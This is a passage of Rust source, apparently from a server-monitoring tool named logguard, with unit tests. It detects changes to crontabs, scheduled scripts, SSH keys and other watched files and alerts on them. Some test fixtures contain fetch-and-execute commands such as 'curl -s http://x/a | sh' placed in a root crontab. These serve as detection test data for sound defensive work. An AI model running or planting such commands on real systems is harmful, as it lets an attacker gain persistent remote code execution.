                plural(v.files, "other watched file")
            ),
            evidence: vec![],
            notify: true,
            owner: None,
        });
        return out;
    };

    let old: BTreeMap<&Key, &String> = b.items.iter().map(|(k, v)| (k, v)).collect();
    let mut by_path: BTreeMap<String, Vec<(char, Key)>> = BTreeMap::new();
    for (k, v) in &r.items {
        match old.get(k) {
            None => by_path.entry(k.path().to_string()).or_default().push(('+', k.clone())),
            Some(o) if *o != v => by_path.entry(k.path().to_string()).or_default().push(('~', k.clone())),
            _ => {}
        }
    }
    for k in old.keys().filter(|k| !r.items.contains_key(*k)) {
        by_path.entry(k.path().to_string()).or_default().push(('-', (*k).clone()));
    }
    drop(old);
    // Files of a `files` pattern added since the last scan (or by the upgrade that brought
    // file watching) are learned, not news; files whose pattern was removed are forgotten.
    let mut learned_files = 0;
    for changes in by_path.values_mut() {
        changes.retain(|(c, k)| match (c, k) {
            ('+', Key::File(p)) => {
                let new_pattern = r.file_patterns.get(p).is_some_and(|pat| !b.patterns.contains(pat));
                learned_files += usize::from(new_pattern);
                !new_pattern
            }
            ('-', Key::File(p)) => r.patterns.iter().any(|pat| pattern_matches(pat, p)),
            _ => true,
        });
    }
    by_path.retain(|_, changes| !changes.is_empty());
    let new_patterns: Vec<&String> = r.patterns.iter().filter(|p| !b.patterns.contains(*p)).collect();
    if learned_files > 0 && !b.patterns.is_empty() {
        out.push(Finding {
            key: "files-learned".into(),
            every: 0,
            severity: Severity::Info,
            message: format!(
                "integrity watch now also covers {} ({})",
                plural(learned_files, "file"),
                new_patterns.iter().map(|p| p.as_str()).collect::<Vec<_>>().join(", ")
            ),
            evidence: vec![],
            notify: false,
            owner: None,
        });
    } else if learned_files > 0 {
        out.push(Finding {
            key: "files-learned".into(),
            every: day,
            severity: Severity::Info,
            message: format!(
                "integrity watch now also covers {}: SSH keys, sudoers, users, sshd settings, systemd units; changes are reported from now on",
                plural(learned_files, "file")
            ),
            evidence: vec![],
            notify: true,
            owner: None,
        });
    }
    b.patterns = r.patterns.iter().cloned().collect();
    let learning = now < b.learning_until;
    b.items = r.items.iter().map(|(k, v)| (k.clone(), v.clone())).collect();

    for (path, changes) in by_path {
        let origin = r.origins.get(&path);
        let from = origin.map(|o| format!(" ({})", o.describe())).unwrap_or_default();
        let lines: Vec<(char, &str)> =
            changes.iter().filter_map(|(c, k)| if let Key::Line(_, l) = k { Some((*c, l.as_str())) } else { None }).collect();
        let added = lines.iter().filter(|(c, _)| *c == '+').count();
        let removed = lines.iter().filter(|(c, _)| *c == '-').count();
        let file_change = changes.iter().find(|(_, k)| !matches!(k, Key::Line(..)));
        let refs = r.script_refs.get(&path).map(|c| format!(" run from {c}")).unwrap_or_default();
        let message = match file_change {
            Some(('+', Key::Crontab(_))) => format!("new crontab {path}{from} with {}", plural(added, "task line")),
            Some(('-', Key::Crontab(_))) => format!("crontab {path} was removed ({} gone)", plural(removed, "task line")),
            Some(('+', Key::Task(_))) => format!("new scheduled task {path}{from}"),
            Some(('~', Key::Task(_))) => format!("scheduled task {path} changed{from}"),
            Some(('-', Key::Task(_))) => format!("scheduled task {path} was removed"),
            // A script appears or disappears with the crontab line that runs it: reported there.
            Some(('+' | '-', Key::Script(_))) => continue,
            Some(('+', Key::File(_))) => format!("new file {path}{from}"),
            Some(('~', Key::File(_))) => format!("{path} changed{from}"),
            Some(('-', Key::File(_))) => format!("{path} was removed"),
            Some(('~', Key::Script(_))) => match r.items.get(&Key::Script(path.clone())).map(String::as_str) {
                Some("missing") => format!("script {path}{refs} was deleted"),
                _ => format!("script {path}{refs} changed{from}"),
            },
            _ if added + removed > 0 => {
                let what = match (added, removed) {
                    (a, 0) => format!("{} added", plural(a, "task line")),
                    (0, d) => format!("{} removed", plural(d, "task line")),
                    (a, d) => format!("{} added, {d} removed", plural(a, "task line")),
                };
                format!("crontab {path} changed{from}: {what}")
            }
            _ => continue,
        };
        let mut evidence: Vec<String> = lines.iter().filter(|(c, _)| *c == '+').map(|(_, l)| format!("+ {}", quote(l))).collect();
        evidence.extend(lines.iter().filter(|(c, _)| *c == '-').map(|(_, l)| format!("- {}", quote(l))));
        // An installer announced this very content (logguard's own binaries and units at
        // every deploy): logged, not news.
        let announced = match file_change {
            Some(('+' | '~', k @ (Key::File(_) | Key::Task(_) | Key::Script(_)))) => {
                r.items.get(k).is_some_and(|fp| r.expected.get(&path) == Some(fp))
            }
            _ => false,
        };
        if learning || announced {
            let why = if learning { "cron watch (learning, accepted)" } else { "integrity (announced by an installer, accepted)" };
            out.push(Finding {
                key: format!("cron-learning:{path}:{now}"),
                every: 0,
                severity: Severity::Info,
                message: format!("{why}: {message}"),
                evidence,
                notify: false,
                owner: None,
            });
            continue;
        }
        let gone_only = changes.iter().all(|(c, _)| *c == '-');
        let severity = match origin {
            _ if gone_only => Severity::Warning,
            Some(Origin::Package(_)) => Severity::Warning,
            _ => Severity::High,
        };
        let advice = if severity == Severity::High { " - if nobody here made this change, the server may be compromised" } else { "" };
        let what = if matches!(file_change, Some((_, Key::File(_)))) { "integrity" } else { "cron" };
        out.push(Finding {
            key: format!("cron:{path}:{now}"),
            every: 0,
            severity,
            message: format!("{what}: {message}{advice}"),
            evidence,
            notify: true,
            owner: r.owners.get(&path).copied(),
        });
    }
    if !learning && !b.armed {
        b.armed = true;
        let v = CronView::of(r, b);
        out.push(Finding {
            key: "cron-armed".into(),
            every: day,
            severity: Severity::Info,
            message: format!(
                "cron watch learned {} in {}, {}, {} and {}; any change is reported from now on",
                plural(v.lines, "crontab line"),
                plural(v.crontabs, "crontab"),
                plural(v.tasks, "task file"),
                plural(v.scripts, "script"),
                plural(v.files, "other watched file")
            ),
            evidence: vec![],
            notify: true,
            owner: None,
        });
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn crontab_lines_and_commands() {
        let text = "# m h dom mon dow command\n\nSHELL=/bin/sh\n30  2 * * *\t/usr/local/bin/av_scan.sh\n@reboot  bash -x /opt/up.sh >> /var/log/up.log 2>&1\n";
        let e = entries(text);
        assert_eq!(e, ["SHELL=/bin/sh", "30 2 * * * /usr/local/bin/av_scan.sh", "@reboot bash -x /opt/up.sh >> /var/log/up.log 2>&1"]);
        assert_eq!(command_of(&e[0], Format::User), None);
        assert_eq!(command_of(&e[1], Format::User).unwrap(), "/usr/local/bin/av_scan.sh");
        assert_eq!(scripts_in(&command_of(&e[2], Format::User).unwrap()), ["/opt/up.sh"]);
        let sys = "17 * * * * root cd / && run-parts --report /etc/cron.hourly";
        assert_eq!(command_of(sys, Format::System).unwrap(), "cd / && run-parts --report /etc/cron.hourly");
        assert!(scripts_in("cd / && run-parts --report /etc/cron.hourly").is_empty());
        assert_eq!(
            command_of("1 5 cron.daily run-parts --report /etc/cron.daily", Format::Anacron).unwrap(),
            "run-parts --report /etc/cron.daily"
        );
        assert_eq!(
            scripts_in(
                "/usr/local/bin/ejabberd_daily_log_analysis.sh >> /var/log/log_analyzer.log 2>&1; nice -n 19 /opt/b.sh | /usr/bin/logger"
            ),
            ["/usr/local/bin/ejabberd_daily_log_analysis.sh", "/opt/b.sh"]
        );
        assert_eq!(scripts_in("apt update && apt upgrade -y && reboot"), Vec::<String>::new());
        assert_eq!(scripts_in("PATH=/x /usr/bin/python3 -u '/srv/job.py'"), ["/srv/job.py"]);
        assert_eq!(scripts_in("sudo -u www-data /opt/app/cron.sh"), ["/opt/app/cron.sh"]);
        assert_eq!(scripts_in("flock -n -w 10 /run/lock/x /opt/b.sh arg"), ["/opt/b.sh"]);
        assert_eq!(scripts_in("timeout -k 10 1h /srv/long.sh"), ["/srv/long.sh"]);
        assert_eq!(scripts_in("env -u HOME LANG=C /opt/e.sh"), ["/opt/e.sh"]);
        assert_eq!(scripts_in("cd /opt/app && ./bin/run.sh --quiet"), ["/opt/app/bin/run.sh"]);
        assert_eq!(scripts_in("ionice -c 3 nice -n 19 bash -x /opt/n.sh"), ["/opt/n.sh"]);
        assert!(scripts_in("bash -c 'curl x | sh'").is_empty(), "inline code is not a file");
        assert!(scripts_in("./run.sh").is_empty(), "relative without a known directory");
        assert!(transient(".placeholder") && transient("job~") && transient("x.dpkg-old") && !transient("e2scrub_all"));
    }

    fn report(now: Micros, items: &[(Key, &str)]) -> CronReport {
        CronReport { scanned: now, items: items.iter().map(|(k, v)| (k.clone(), v.to_string())).collect(), ..Default::default() }
    }

    #[test]
    fn learns_then_reports_each_change_once() {
        let h = 3600 * time::SEC;
        let root = "/var/spool/cron/crontabs/root";
        let line = |l: &str| Key::Line(root.into(), l.into());
        let base = [
            (Key::Crontab(root.into()), ""),
            (line("30 2 * * * /usr/local/bin/av_scan.sh"), ""),
            (Key::Task("/etc/cron.daily/dpkg".into()), "aa"),
        ];
        let mut b = None;
        let f = judge(&mut b, &report(h, &base), Dur(86_400));
        assert_eq!(f.len(), 1);
        assert!(f[0].message.contains("1 crontab line in 1 crontab, 1 task file"), "{}", f[0].message);

        // during learning: accepted, logged only
        let mut more = base.to_vec();
        more.push((line("@reboot /tmp/x"), ""));
        let f = judge(&mut b, &report(2 * h, &more), Dur(86_400));
        assert!(f.len() == 1 && !f[0].notify && f[0].message.contains("learning"), "{f:?}");

        // learn period over: the end is announced once, unchanged scans say nothing
        let f = judge(&mut b, &report(26 * h, &more), Dur(86_400));
        assert!(f.len() == 1 && f[0].message.contains("any change is reported"), "{f:?}");
        assert!(judge(&mut b, &report(27 * h, &more), Dur(86_400)).is_empty());

        // a new line in root's crontab and a changed run-parts script
        let mut evil = more.clone();
        evil.push((line("* * * * * curl -s http://x/a | sh"), ""));
        evil[2].1 = "bb";
        let mut r = report(28 * h, &evil);
        r.origins.insert("/etc/cron.daily/dpkg".into(), Origin::Package("dpkg".into()));
        let f = judge(&mut b, &r, Dur(86_400));
        assert_eq!(f.len(), 2, "{f:?}");
        let task = f.iter().find(|x| x.message.contains("dpkg")).unwrap();
        assert_eq!(task.severity, Severity::Warning);
        assert!(task.message.contains("installed by package dpkg, unmodified"));
        let cron = f.iter().find(|x| x.message.contains(root)).unwrap();
        assert_eq!(cron.severity, Severity::High);
        assert!(cron.message.contains("1 task line added") && cron.message.contains("compromised"), "{}", cron.message);
        assert_eq!(cron.evidence, ["+ `* * * * * curl -s http://x/a | sh`"]);
        assert!(judge(&mut b, &report(29 * h, &evil), Dur(86_400)).is_empty(), "reported once");

        // removing the AV scan line: a warning, not "compromised"
        let fewer: Vec<_> = evil.iter().filter(|(k, _)| *k != line("30 2 * * * /usr/local/bin/av_scan.sh")).cloned().collect();
        let f = judge(&mut b, &report(30 * h, &fewer), Dur(86_400));
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].severity, Severity::Warning);
        assert!(f[0].message.contains("1 task line removed"));
    }

    #[test]
    fn announced_changes_are_logged_not_alerted() {
        let h = 3600 * time::SEC;
        let bin = "/usr/local/bin/logguard";
        let rep = |t: Micros, fp: &str, expected: &[(&str, &str)]| {
            let mut r = report(t, &[(Key::File(bin.into()), fp)]);
            r.patterns = vec!["/usr/local/bin/*".into()];
            r.file_patterns.insert(bin.into(), "/usr/local/bin/*".into());
            r.expected = expected.iter().map(|(p, f)| (p.to_string(), f.to_string())).collect();
            r
        };
        let mut b = None;
        judge(&mut b, &rep(h, "aa", &[]), Dur(0));
        // the installer announced exactly this content
        let f = judge(&mut b, &rep(2 * h, "bb", &[(bin, "bb")]), Dur(0));
        assert!(f.len() == 1 && !f[0].notify && f[0].severity == Severity::Info, "{f:?}");
        assert!(f[0].message.contains("announced by an installer") && f[0].message.contains(bin), "{}", f[0].message);
        // other content than announced: the usual alert
        let f = judge(&mut b, &rep(3 * h, "cc", &[(bin, "bb")]), Dur(0));
        assert!(f.len() == 1 && f[0].notify && f[0].severity == Severity::High, "{f:?}");
    }

    #[test]
    fn announcements_are_kept_for_a_while() {
        let dir = std::env::temp_dir().join(format!("logguard-expect-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let path = expected_path(&dir.join("state.json"));
        let (fa, fb) = ("a".repeat(64), "b".repeat(64));
        let day = 86_400 * time::SEC;
        record_expected(&path, &[("/usr/local/bin/x".into(), fa.clone()), ("/etc/y z".into(), fa.clone())], day).unwrap();
        record_expected(&path, &[("/usr/local/bin/x".into(), fb.clone())], 2 * day).unwrap();
        let e = load_expected(&path, 2 * day);
        assert_eq!(e.len(), 2);
        assert_eq!(e["/usr/local/bin/x"], fb, "a newer announcement replaces the older");
        assert_eq!(e["/etc/y z"], fa, "paths may hold spaces");
        assert_eq!(load_expected(&path, day + EXPECT_TTL).len(), 1, "expired after EXPECT_TTL");
        assert!(record_expected(&path, &[("relative".into(), fa.clone())], day).is_err());
        assert!(record_expected(&path, &[("/a\nb".into(), fa)], day).is_err());
        assert!(load_expected(&dir.join("missing"), day).is_empty());
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn watches_files_and_learns_new_patterns_quietly() {
        let h = 3600 * time::SEC;
        let keys = "/root/.ssh/authorized_keys";
        let rep = |t: Micros, items: &[(Key, &str)], patterns: &[&str]| {
            let mut r = report(t, items);
            r.patterns = patterns.iter().map(|p| p.to_string()).collect();
            for (k, _) in items {
                if let Key::File(p) = k {
                    let pat = patterns.iter().find(|pat| pattern_matches(pat, p)).unwrap();
                    r.file_patterns.insert(p.clone(), pat.to_string());
                }
            }
            r
        };
        // an armed baseline from before file watching existed (no patterns)
        let mut b = Some(Baseline { learning_until: 0, armed: true, items: vec![], patterns: BTreeSet::new() });
        let pats = ["/root/.ssh/authorized_keys", "/home/*/.ssh/authorized_keys"];
        let f = judge(&mut b, &rep(30 * h, &[(Key::File(keys.into()), "aa")], &pats), Dur(86_400));
        assert!(f.len() == 1 && f[0].severity == Severity::Info && f[0].message.contains("1 file"), "{f:?}");

        // an added key: high
        let f = judge(&mut b, &rep(31 * h, &[(Key::File(keys.into()), "bb")], &pats), Dur(86_400));
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].severity, Severity::High);
        assert!(f[0].message.starts_with("integrity: /root/.ssh/authorized_keys changed"), "{}", f[0].message);

        // a new user's keys appear: reported as new
        let both = [(Key::File(keys.into()), "bb"), (Key::File("/home/eve/.ssh/authorized_keys".into()), "cc")];
        let f = judge(&mut b, &rep(32 * h, &both, &pats), Dur(86_400));
        assert!(f.len() == 1 && f[0].message.contains("new file /home/eve/.ssh/authorized_keys"), "{f:?}");

        // a pattern added to the config: its files are learned, not reported
        let pats2 = ["/root/.ssh/authorized_keys", "/home/*/.ssh/authorized_keys", "/etc/sudoers"];
        let mut three = both.to_vec();
        three.push((Key::File("/etc/sudoers".into()), "dd"));
        let f = judge(&mut b, &rep(33 * h, &three, &pats2), Dur(86_400));
        assert!(f.iter().all(|x| x.severity == Severity::Info && !x.notify), "{f:?}");

        // ...and a removed pattern's files are forgotten without "removed" alerts
        let f = judge(&mut b, &rep(34 * h, &both, &pats), Dur(86_400));
        assert!(f.is_empty(), "{f:?}");
        // but a watched file disappearing is a warning
        let f = judge(&mut b, &rep(35 * h, &both[..1], &pats), Dur(86_400));
        assert!(f.len() == 1 && f[0].severity == Severity::Warning && f[0].message.contains("was removed"), "{f:?}");
    }

    #[test]
    fn globs_in_any_component() {
        let dir = std::env::temp_dir().join(format!("logguard-glob-{}", std::process::id()));
        for u in ["alice", "bob", ".hidden"] {
            std::fs::create_dir_all(dir.join(u).join(".ssh")).unwrap();
            std::fs::write(dir.join(u).join(".ssh/authorized_keys"), "k").unwrap();
        }
        let pattern = format!("{}/*/.ssh/authorized_keys", dir.display());
        let found = expand_glob(&pattern);
        assert_eq!(found.len(), 2, "{found:?}");
        assert!(found.iter().all(|p| pattern_matches(&pattern, &p.display().to_string())));
        assert!(!pattern_matches("/etc/systemd/system/*", "/etc/systemd/system/multi-user.target.wants/x.service"));
        assert!(pattern_matches("/etc/systemd/system/*.wants/*", "/etc/systemd/system/multi-user.target.wants/x.service"));
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn package_origins_from_the_dpkg_database() {
        use md5::{Digest as _, Md5};
        let dir = std::env::temp_dir().join(format!("logguard-dpkg-{}", std::process::id()));
        let (db, files) = (dir.join("db"), dir.join("files"));
        std::fs::create_dir_all(db.join("info")).unwrap();
        std::fs::create_dir_all(&files).unwrap();
        let path = |n: &str| files.join(n).display().to_string();
        let md5 = |t: &str| Md5::digest(t.as_bytes()).iter().map(|b| format!("{b:02x}")).collect::<String>();
        std::fs::write(path("conf"), "packaged\n").unwrap(); // a conffile, unmodified
        std::fs::write(path("script"), "edited\n").unwrap(); // a packaged file, modified
        std::fs::write(path("mine"), "x\n").unwrap(); // nobody's
        std::fs::write(db.join("info/cron.list"), format!("/.\n{}\n{}\n", path("conf"), path("script"))).unwrap();
        std::fs::write(db.join("info/cron.md5sums"), format!("{}  {}\n", md5("original\n"), &path("script")[1..])).unwrap();
        std::fs::write(
            db.join("status"),
            format!(
                "Package: cron\nStatus: install ok installed\nConffiles:\n {} {}\nDescription: x\n more text here\n\n",
                path("conf"),
                md5("packaged\n")
            ),
        )
        .unwrap();
        let o = dpkg_origins(&db, &[path("conf"), path("script"), path("mine")]);
        assert_eq!(o.get(&path("conf")), Some(&Origin::Package("cron".into())));
        assert_eq!(o.get(&path("script")), Some(&Origin::ModifiedPackage("cron".into())));
        assert_eq!(o.get(&path("mine")), None, "unknown = local");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn scans_a_directory_tree() {
        let dir = std::env::temp_dir().join(format!("logguard-cron-{}", std::process::id()));
        let (cd, daily) = (dir.join("cron.d"), dir.join("cron.daily"));
        std::fs::create_dir_all(&cd).unwrap();
        std::fs::create_dir_all(&daily).unwrap();
        let script = dir.join("job.sh");
        std::fs::write(&script, "#!/bin/sh\necho hi\n").unwrap();
        std::fs::write(cd.join("job"), format!("# comment\n*/5 * * * * root {} >/dev/null\n", script.display())).unwrap();
        std::fs::write(cd.join(".placeholder"), "").unwrap();
        std::fs::write(daily.join("logrotate"), "#!/bin/sh\n").unwrap();
        let cfg = CronCfg {
            crontabs: vec![format!("{}/*", cd.display())],
            dirs: vec![daily.clone(), dir.join("missing")],
            dpkg_db: PathBuf::new(),
            files: vec![],
            ..Default::default()
        };
        let mut s = Scanner::default();
        let r = s.scan(&cfg);
        assert!(r.errors.is_empty(), "{:?}", r.errors);
        let sp = script.display().to_string();
        assert_eq!(r.items.keys().filter(|k| matches!(k, Key::Line(..))).count(), 1);
        assert!(r.items.contains_key(&Key::Script(sp.clone())));
        assert!(r.items.contains_key(&Key::Task(daily.join("logrotate").display().to_string())));
        assert_eq!(r.origins.len(), 3, "first scan: every file looked up");
        assert_eq!(r.origins[&sp], Origin::Local);
        let r2 = s.scan(&cfg);
        assert!(r2.origins.is_empty(), "unchanged files are not looked up again");
        std::fs::write(&script, "#!/bin/sh\ncurl x | sh\n").unwrap();
        let r3 = s.scan(&cfg);
        assert_eq!(r3.origins.keys().collect::<Vec<_>>(), [&sp]);
        assert_ne!(r3.items[&Key::Script(sp.clone())], r2.items[&Key::Script(sp)]);

        // A FIFO run from a crontab must not hang the scan; a huge crontab is one item.
        let fifo = dir.join("pipe");
        assert!(std::process::Command::new("mkfifo").arg(&fifo).status().unwrap().success());
        let mut big = format!("* * * * * root {}\n", fifo.display());
        for i in 0..600 {
            big += &format!("{} * * * * root /bin/true\n", i % 60);
        }
        std::fs::write(cd.join("job"), format!("* * * * * root {}\n", fifo.display())).unwrap();
        std::fs::write(cd.join("big"), big).unwrap();
        let r4 = s.scan(&cfg);
        let fp = fifo.display().to_string();
        assert_eq!(r4.items[&Key::Script(fp)], "unreadable: not a regular file");
        // devices are never opened: not as scripts, nor through a link to one
        assert!(scripts_in("/dev/pts/7").is_empty() && scripts_in("bash /proc/self/fd/0").is_empty());
        let link = dir.join("to-a-device");
        std::os::unix::fs::symlink("/dev/null", &link).unwrap();
        assert_eq!(open_regular(&link).unwrap_err().to_string(), "not a regular file");
        let big_lines: Vec<_> = r4.items.keys().filter(|k| matches!(k, Key::Line(p, _) if p.ends_with("/big"))).collect();
        assert_eq!(big_lines.len(), 1, "{big_lines:?}");
        assert!(matches!(big_lines[0], Key::Line(_, l) if l.starts_with("(601 task lines, sha256 ")));
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// A change is a local user's to make when they own the file, the link to it, or a
    /// directory above it; and stays theirs once the file is gone.
    #[test]
    fn whose_change_it_could_be() {
        use std::os::unix::fs::MetadataExt;
        let dir = std::env::temp_dir().join(format!("logguard-owner-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let me = std::fs::metadata(&dir).unwrap().uid();
        let mine = (me != 0).then_some(me);
        let script = dir.join("job.sh");
        std::fs::write(&script, "#!/bin/sh\n").unwrap();
        assert_eq!(changed_by(&script), mine);
        assert_eq!(changed_by(&dir.join("not-there-yet")), mine, "the directory is the user's");
        assert_eq!(changed_by(Path::new("/bin/sh")), None, "only root changes the system's programs");

        let crontab = dir.join("crontab");
        std::fs::write(&crontab, format!("* * * * * {}\n", script.display())).unwrap();
        let cfg = CronCfg { crontabs: vec![crontab.display().to_string()], dirs: vec![], files: vec![], ..Default::default() };
        let mut s = Scanner::default();
        let r = s.scan(&cfg);
        let (cp, sp) = (crontab.display().to_string(), script.display().to_string());
        assert_eq!((r.owners.get(&cp).copied(), r.owners.get(&sp).copied()), (mine, mine));
        std::fs::remove_file(&crontab).unwrap();
        assert_eq!(s.scan(&cfg).owners.get(&cp).copied(), mine, "a removed crontab is still its user's");
        assert_eq!(s.scan(&cfg).owners.get(&cp), None, "for one scan");
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// A program root owns is hashed whole (a change deep in a large one must show); anyone
    /// else's file only to its first 16 MB, as its owner can make it huge and touch it often.
    #[test]
    fn how_much_of_a_file_is_hashed() {
        use std::io::{Seek, Write};
        use std::os::unix::fs::MetadataExt;
        assert_eq!((hashed_bytes(0), hashed_bytes(1000)), (MAX_HASHED_ROOT, MAX_HASHED));
        let dir = std::env::temp_dir().join(format!("logguard-fp-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("big");
        let mut f = std::fs::File::create(&path).unwrap();
        f.set_len(MAX_HASHED + (1 << 20)).unwrap();
        let before = fingerprint(&path).unwrap();
        f.seek(std::io::SeekFrom::Start(MAX_HASHED + 4096)).unwrap();
        f.write_all(b"patched").unwrap();
        drop(f);
        let after = fingerprint(&path).unwrap();
        let owner = std::fs::metadata(&path).unwrap().uid();
        assert_eq!(before == after, owner != 0, "owner uid {owner}");
        let _ = std::fs::remove_dir_all(&dir);
    }
}
